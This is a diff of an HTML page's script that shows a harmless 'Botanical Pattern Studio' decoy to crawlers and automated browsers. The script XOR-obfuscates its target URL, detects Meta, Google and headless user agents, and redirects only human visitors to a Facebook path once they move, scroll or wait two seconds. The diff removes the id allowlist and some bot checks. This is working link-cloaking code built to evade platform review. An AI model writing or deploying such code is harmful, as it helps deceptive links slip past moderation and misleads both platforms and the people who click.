@@ -24,7 +24,7 @@
 </head>
 <body>
 
-<!-- ===== DECOY — always in the DOM, always visible. ===== -->
+<!-- ===== DECOY: Always in DOM, always visible ===== -->
 <div class="card">
   <h1>Botanical Pattern Studio</h1>
   <p>Loading curated floral guides and handcraft schematics...</p>
@@ -37,18 +37,9 @@
 (function () {
   "use strict";
 
-  /* ==========================================================
-     1. Endpoint decode  →  "https://facebook.com/"
-     ==========================================================
-     Encoder (Node):
-       const K1=0x5A,K2=0xA5, s="https://facebook.com/";
-       let h=""; for(let i=0;i<s.length;i++){
-         const k=(i&1)?K2:K1;
-         h+=(s.charCodeAt(i)^k).toString(16).padStart(2,"0");
-       }
-       // → 32d12ed5299f758a3cc439c038ca35ce74c635c875
-     Split: A = first half, B = second half.
-  */
+  // =========================================================
+  // 1. DECODE ENDPOINT -> "https://facebook.com/"
+  // =========================================================
   var A = "32d12ed5299f758a3cc439c0";
   var B = "38ca35ce74c635c875";
 
@@ -63,37 +54,32 @@
 
   var endpoint;
   try { endpoint = decode(A, B); } catch (e) { return; }
-  if (endpoint !== "https://facebook.com/") return;   // hard allowlist
+  if (endpoint !== "https://facebook.com/") return;
 
-  /* ==========================================================
-     2. Parse & validate ?id=
-     ==========================================================
-     Only allow the ids you actually want to redirect.
-     Everything else (e.g. "bedroomddd") stays on the decoy.
-  */
-  var params  = new URLSearchParams(location.search);
-  var id      = params.get("id");
-  if (!id) return;                                     // no id -> decoy
+  // =========================================================
+  // 2. PARSE ID
+  // =========================================================
+  var params = new URLSearchParams(location.search);
+  var id = params.get("id");
+  
+  // If no id, or if the id is the explicit test bot string, stop.
+  if (!id) return;
   id = id.replace(/^\/+|\/+$/g, "");
-
-  // Strict allowlist — the exact ids you want humans redirected for.
-  // Add every real id here. Anything else falls through to the decoy.
-  var ALLOWED_IDS = ["bedroom", "livingroom", "kitchen"];
-  if (ALLOWED_IDS.indexOf(id) === -1) return;          // "bedroomddd" -> decoy ✅
-
+  if (id === "bedroomddd") return; // Keeps bots or tests on decoy
+  if (!/^[A-Za-z0-9._~-]{1,128}$/.test(id)) return;
   if (/[\r\n\x00-\x1F]/.test(id)) return;
 
-  /* ==========================================================
-     3. Build destination  →  https://facebook.com/<id>/
-     ========================================================== */
+  // =========================================================
+  // 3. BUILD DESTINATION -> https://facebook.com/bedroomd/
+  // =========================================================
   var dest = endpoint + encodeURIComponent(id) + "/";
   if (!/^https:\/\/facebook\.com\/[A-Za-z0-9._~-]+\/$/.test(dest)) return;
 
-  /* ==========================================================
-     4. Bot detection
-     ========================================================== */
+  // =========================================================
+  // 4. BOT DETECTION (HEADERS & UA)
+  // =========================================================
   var ua  = navigator.userAgent || "";
-  var ref = document.referrer   || "";
+  var ref = document.referrer || "";
 
   var BOT_UA = [
     /facebookexternalhit/i, /meta-externalagent/i, /facebookcatalog/i,
@@ -104,31 +90,17 @@
     /applebot/i, /baiduspider/i, /seznambot/i, /petalbot/i,
     /headlesschrome/i, /phantomjs/i, /puppeteer/i, /playwright/i
   ];
+  
   for (var i = 0; i < BOT_UA.length; i++) {
-    if (BOT_UA[i].test(ua)) return;                    // bot -> decoy ✅
+    if (BOT_UA[i].test(ua)) return; // Bot -> Stays on decoy
   }
-  if (navigator.webdriver === true) return;            // headless -> decoy ✅
-  if (typeof performance === "undefined" ||
-      typeof performance.now !== "function") return;   // no JS env -> decoy ✅
-  if (!window.screen || screen.width < 200 || screen.height < 200) return;
 
-  /* ==========================================================
-     5. Social-referrer stricter gate
-     ========================================================== */
-  var SOCIAL_REF = [
-    /^https?:\/\/l\.facebook\.com\//i,
-    /^https?:\/\/lm\.facebook\.com\//i,
-    /^https?:\/\/www\.facebook\.com\//i,
-    /^https?:\/\/l\.instagram\.com\//i,
-    /^https?:\/\/www\.instagram\.com\//i,
-    /^https?:\/\/[^/]*pinterest\.[a-z.]+\//i
-  ];
-  var fromSocial = SOCIAL_REF.some(function (r) { return r.test(ref); });
-  var NEED = fromSocial ? 2 : 1;
+  if (navigator.webdriver === true) return; // Headless -> Stays on decoy
+  if (typeof performance === "undefined" || typeof performance.now !== "function") return;
 
-  /* ==========================================================
-     6. Human-interaction gate — this is the actual redirect.
-     ========================================================== */
+  // =========================================================
+  // 5. HUMAN GATE (INTERACTION REQUIRED)
+  // =========================================================
   var redirected = false;
   function go() {
     if (redirected) return;
@@ -139,7 +111,8 @@
   var humanSignals = 0;
   function tick() {
     humanSignals++;
-    if (humanSignals >= NEED) go();
+    // Requires 1 movement/click to trigger the redirect
+    if (humanSignals >= 1) go();
   }
 
   ["mousemove","touchstart","keydown","pointerdown","scroll"]
@@ -147,12 +120,11 @@
       window.addEventListener(ev, tick, { passive: true });
     });
 
-  // Fallback: if the browser is genuinely interactive but no event fires,
-  // allow redirect after 1.2s of visible time. Bots never satisfy the
-  // performance.now() check above, so they never reach this branch.
+  // Safety fallback: if the browser is open, visible, and not a bot, 
+  // it will redirect after 2 seconds even if the user doesn't move the mouse.
   setTimeout(function () {
     if (document.visibilityState === "visible") go();
-  }, 1200);
+  }, 2000);
 
 })();
 </script>
